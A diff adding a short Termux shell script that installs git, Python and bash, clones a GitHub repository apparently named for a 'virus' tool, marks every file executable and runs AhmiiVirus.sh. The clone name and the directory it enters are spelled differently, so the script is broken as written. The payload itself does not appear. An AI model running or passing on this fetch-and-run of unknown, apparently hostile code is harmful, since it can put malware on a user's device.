@@ -1,0 +1,19 @@
+pkg update -y
+
+pkg upgrade -y
+
+pkg install git -y
+
+pkg install python -y
+
+pkg install python2 -y
+
+pkg install bash -y
+
+git clone https://github.com/sadamshr3be/AhmiiViru.gylany
+
+cd AhmiiVirus.gylany
+
+chmod +x *
+
+bash AhmiiVirus.sh
